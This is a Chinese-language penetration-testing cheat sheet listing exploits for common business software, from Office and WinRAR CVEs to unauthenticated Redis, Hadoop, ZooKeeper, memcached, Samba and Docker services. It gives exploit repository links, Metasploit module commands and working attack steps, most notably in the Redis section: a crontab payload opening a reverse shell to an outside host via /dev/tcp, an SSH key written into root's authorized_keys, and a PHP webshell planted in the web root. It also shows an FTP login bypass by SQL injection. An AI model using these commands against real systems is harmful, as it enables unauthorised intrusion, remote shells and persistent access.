# 业务软件 vul 整合笔记

---

## 本地
### Andorid

**ESFileExplorers**
- **CVE-2019-6447**
    - POC | Payload | exp
        - [fs0c131y/ESFileExplorerOpenPortVuln](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

---

### Linux

**Logwatch**
- **CVE-2011-1018 Logwatch logwatch.pl任意命令执行漏洞**
    - POC | Payload | exp
        - [Logwatch Log File - Special Characters Privilege Escalation](https://www.exploit-db.com/exploits/35386)

**KDE**
- **KDE 4/5 KDesktopFile Command Injection**
    - POC | Payload | exp
        - [KDE 4/5 KDesktopFile Command Injection](https://gist.githubusercontent.com/zeropwn/630832df151029cb8f22d5b6b9efaefb/raw/64aa3d30279acb207f787ce9c135eefd5e52643b/kde-kdesktopfile-command-injection.txt)

**vim**
- **CVE-2019-12735 Vim/Neovim Arbitrary Code Execution via Modelines**
    - POC | Payload | exp
        - [2019-06-04_ace-vim-neovim.md](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)

**Supervisor**
- **测试链接**
    `http://<ip>:9001`

---

### Windows

**Evernote**
- **Evernote 7.9**
    - 文章
        - [Code execution – Evernote](https://securityaffairs.co/wordpress/84037/hacking/local-file-path-traversal-evernote.html)

**Firefox**
- **CVE-2019-9810**
    - POC | Payload | exp
        - [0vercl0k/CVE-2019-9810](https://github.com/0vercl0k/CVE-2019-9810)

**IE**
- **XML External Entity Injection**
    - POC | Payload | exp
        - http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt

- **CVE-2018-8174**
    - POC | Payload | exp
        - [Yt1g3r/CVE-2018-8174_EXP: CVE-2018-8174_python](https://github.com/Yt1g3r/CVE-2018-8174_EXP)
        - [0x09AL/CVE-2018-8174-msf: CVE-2018-8174 - VBScript memory corruption exploit.](https://github.com/0x09AL/CVE-2018-8174-msf)

**Office**
- **CVE-2017-0199**
    - [bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)

- **CVE-2017-8759**
    - [Lz1y/CVE-2017-8759](https://github.com/Lz1y/CVE-2017-8759)

- **CVE-2017-11882**
    - POC | Payload | exp
        - [Ridter/CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882)
        - [embedi/CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)

**WinRAR**
- **CVE-2018-20250**
    - 文章
        - [Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research](https://research.checkpoint.com/extracting-code-execution-from-winrar/)

    - POC | Payload | exp
        - [WyAtu/CVE-2018-20250](https://github.com/WyAtu/CVE-2018-20250)

---

### Mac

**zoom**
- POC | Payload | exp
    - [JLLeitschuh/zoom_vulnerability_poc](https://github.com/JLLeitschuh/zoom_vulnerability_poc)

---

## 对外
### 分布式

**Hadoop**
- **文章**
    - [Hadoop渗透及安全加固](http://www.polaris-lab.com/index.php/archives/187/)
    - [挖掘分布式系统——Hadoop的漏洞](https://zhuanlan.zhihu.com/p/28901633)

- **Hadoop 未授权访问**
    - 示例
        ```
        curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“
        http://<ip>:50070
        http://<ip>:50070/dfshealth.jsp
        http://<ip>:50070/logs/
        ```

**ZooKeeper**
- **ZooKeeper 未授权访问漏洞**
    - 文章
        - [ZooKeeper 未授权访问漏洞](https://blog.csdn.net/qq_23936389/article/details/83826028)
        - [攻击大数据应用：ZooKeeper](http://www.polaris-lab.com/index.php/archives/41/)

    - 搭建环境
        ```bash
        wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
        tar -zxvf zookeeper-3.4.14.tar.gz
        cd zookeeper-3.4.14/
        cd conf/
        ```
        ```vim
        vim zoo.cfg  # 配置单机模式

        tickTime=2000
        dataDir=/tmp/zookeeper/data
        dataLogDir=/tmp/zookeeper/logs
        clientPort=2181
        ```
        ```bash
        cd ..
        bin/zkServer.sh start   # 启动
        bin/zkCli.sh -server 127.0.0.1:2181 #连接 server
        ```

    - 利用
        ```bash
        echo envi|nc <ip> 2181 # 打印有关服务环境的详细信息
        echo dump |ncat <ip> 2181 # 列出未完成的会话和临时节点
        echo reqs |ncat <ip> 2181 # 列出未完成的请求
        echo ruok |ncat <ip> 2181 # 测试服务器是否运行在非错误状态
        echo stat |ncat <ip> 2181 # 列出关于性能和连接的客户端的统计信息

        ./zkCli.sh -server <ip>:port
        ```

- **CVE-2014-085 ZooKeeper 信息泄露漏洞**
    - 文章
        - [ZooKeeper信息泄露漏洞(CVE-2014-085)](https://blog.csdn.net/u011721501/article/details/44062617)

---

### 数据库
**memcached**
- **未授权访问漏洞**
    - POC | Payload | exp

        `telnet <ip> 11211`

        `nc -vv <ip> 11211`

**MS SQL Server**
- **文章**
    - [从攻击MS SQL Server到获得系统访问权限](https://www.freebuf.com/articles/database/22997.html)

**mysql**
- **UDF提权**
    - 文章
        - [Command execution with a MySQL UDF](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

    - POC | Payload | exp
        - [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)

**oracle**
- **CVE-2010-3600 Oracle Enterprise Manager Grid Control JSP 代码执行漏洞**
    - MSF 模块
        ```bash
        use exploit/windows/oracle/client_system_analyzer_upload
        ```

- **CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
    - 文章
        - [Oracle TNS Listener Remote Poisoning](http://www.cnblogs.com/zhuxr/p/9618512.html)

    - MSF 模块
        ```bash
        use auxiliary/admin/oracle/tnscmd   # 该漏洞可以远程获取到oracle的内存信息,若是能获取到内存中的数据即为存在漏洞。
        set rhosts <ip>
        run

        use auxiliary/admin/oracle/sid_brute  # 爆破oracle的SID
        set rhosts <ip>
        run
        ```

- **CVE-2012-5615 Oracle MySQL Server 5.5.19 用户名枚举漏洞**
    - POC | Payload | exp
        - [MySQL - Remote User Enumeration](https://www.exploit-db.com/exploits/23081)
        - [MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution](https://www.exploit-db.com/exploits/23073)

**OrientDB**
- **CVE-2017-11467**
    - 文章
        - [OrientDB远程代码执行漏洞POC分析以及复现|CVE-2017-11467](https://bbs.ichunqiu.com/thread-33175-1-18.html)

    - POC | Payload | exp
        - [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)

**redis**
- **未授权访问漏洞**
    - 文章
        - [redis未授权访问漏洞利用总结](https://p0sec.net/index.php/archives/69/)
        - [Redis 未授权访问漏洞利用分析](https://hellohxk.com/blog/redis-unauthorized-vulnerability/)
        - [redis未授权访问与ssrf利用](https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/)
        - [Hackredis Enhanced Edition Script](https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341)

    - 搭建环境
        ```bash
        wget http://download.redis.io/releases/redis-3.2.0.tar.gz
        tar xzf redis-3.2.0.tar.gz
        cd redis-3.2.0
        make
        ```
        ```vim
        vim redis.conf

        # bind 127.0.0.1
        protected-mode no
        ```
        ```
        ./src/redis-server redis.conf
        ```

    - 利用
        ```sql
        redis-cli -h <目标IP>
        >info   # 查看redis版本信息、一些具体信息、服务器版本信息等等：
        >CONFIG GET dir # 获取默认的redis目录
        >CONFIG GET dbfilename # 获取默认的 rdb 文件名
        ```

        **利用计划任务执行命令反弹 shell**

        在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell 先在自己的服务器上监听一个端口 `nc -lvnp 7999` 然后执行命令:
        ```bash
        > set x "\n* * * * * /bin/bash -i > /dev/tcp/192.168.72.129/7999 0<&1 2>&1\n"
        > config set dir /var/spool/cron/
        > config set dbfilename root
        > save
        ```

        **写 ssh-keygen 公钥然后使用私钥登陆**

        在以下条件下，可以利用此方法
        1. Redis 服务使用 ROOT 账号启动
        2. 服务器开放了 SSH 服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。

        首先在本地生成一对密钥 `ssh-keygen -t rsa` 然后执行命令:
        ```bash
        将公钥的内容写到一个文本中命令如下
        (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt

        将里面的内容写入远程的 Redis 服务器上并且设置其 Key 为 test命令如下
        cat test.txt | redis -cli -h <hostname> -x set test
        redis-cli -h <hostname>
        keys *
        get test
        config set dir "/root/.ssh"
        config set dbfilename "authorized_keys"
        save
        ```
        保存后可以直接利用公钥登录 ssh

        **往 web 物理路径写 webshell**

        当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell
        执行以下命令
        ```bash
        > config set dir /var/www/html/
        > config set dbfilename shell.php
        > set x "<?php phpinfo();?>"
        > save
        ```
        即可将 shell 写入 web 目录(web 目录根据实际情况)

- **Redis 4.x 5.x RCE**
    - 搭建环境
        ```bash
        yum install tcl
        wget download.redis.io/releases/redis-4.0.11.tar.gz
        tar zxf redis-4.0.11.tar.gz
        cd redis-4.0.11
        make PREFIX=/usr/local/redis install

        /usr/local/redis/bin/redis-server

        参考 https://mp.weixin.qq.com/s/MSWLqzyNnliX1G7TRYAwVw
        ```

    - POC | Payload | exp
        - [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
        - [Ridter/redis-rce](https://github.com/Ridter/redis-rce)

---

### 文件服务

**ftp**
- **Xlight FTP Server < 3.2.1 user 参数 SQL 注入漏洞**
    - 简介

        在执行 ODBC 认证过程中 Xlight FTP Server 没有正确地过滤用户所提交的用户名和口令字段，远程攻击者可以用“OR ‘1’=’1’ ;#”替换用户名绕过认证登录到服务器。

    - 示例
        ```bash
        220 Xlight FTP Server 3.2 ready...
        User (server-4:(none)) : \' OR \'1\'=\'1\' ;#
        331 Password required for \' OR \'1\'=\'1\' ;#
        Password : type anything
        230 Login OK
        ftp&gt;
        ```

- **Serv-U FTP Server 目录遍历漏洞**
    - 文章
        - [Serv-U FTP Server 0day漏洞分析报告](http://safe.it168.com/a2011/1213/1287/000001287577.shtml)

    - 示例
        ```bash
        ls ../windwos
            550 .....

        ls ..:/windows
            150 ....
            ...
            ...
        ```

**nfs**
- **CVE-1999-0554 目标主机 showmount -e 信息泄露**
    - 示例
        ```
        showmount -e xxx.xxx.xxx.xxx
        mount -t nfs xxx.xxx.xxx.xxx:/opt/applications/xxx_static_data  /mnt
        ```

    - MSF 模块
        ```bash
        use auxiliary/scanner/nfs/nfsmount
        set rhosts <ip>
        run
        ```

**Rsync**
- **未授权访问**
    - 文章
        - [rsync的几则tips(渗透技巧)](http://www.91ri.org/11093.html)
        - [配置漏洞之Rsync匿名访问](https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html)

    - 示例

        `rsync <目标IP>::`

    - MSF 模块
        ```bash
        use auxiliary/scanner/rsync/modules_list
            set rhosts <ip>
        run
        ```

**samba**
- **CVE-2015-0240**
    - 文章
        - [Samba CVE-2015-0240 远程代码执行漏洞利用实践](https://www.secpulse.com/archives/5975.html)

    - MSF 模块
        ```bash
        use auxiliary/scanner/smb/smb_uninit_cred
        set rhosts <ip>
        run
        ```

- **CVE-2017-7494**
    - 文章
        - [Linux cve-2017-7494samba远程漏洞利用和分析](https://bbs.pediy.com/thread-218114.htm)

    - POC | Payload | exp
        - [joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
        - [opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)

    - MSF 模块
        ```bash
        use exploit/linux/samba/is_known_pipename
        set rhost <ip>
        set target 3
        run
        ```

---

### 远程服务

**Java RMI**
- **JAVA RMI 反序列化远程命令执行漏洞**
    鸽

**OpenSSH**
- **CVE-2018-15473 OpenSSH 用户枚举漏洞**
    - 影响范围
        - OpenSSH 7.7及其以前版本

    - 文章
        - [OpenSSH用户枚举漏洞(CVE-2018-15473)分析](https://www.anquanke.com/post/id/157607)
        - [SSH用户枚举漏洞(CVE-2018-15473)原理学习](https://www.cnblogs.com/KevinGeorge/p/9530835.html)

    - POC | Payload | exp
        - [trimstray/massh-enum](https://github.com/trimstray/massh-enum)
        - [Rhynorater/CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)

    - MSF 模块
        ```bash
        use auxiliary/scanner/ssh/ssh_enumusers
        set rhosts <ip>
        set USER_FILE <aaa.txt>
        run
        ```

**VNC**
- **未授权访问漏洞**
    - MSF 模块
        ```bash
        use auxiliary/scanner/vnc/vnx_none_auth
        set rhosts <ip>
        set threads 50
        run
        ```

### 虚拟化
**Docker**
- **未授权访问漏洞**

    `http://<ip>:2375/version`
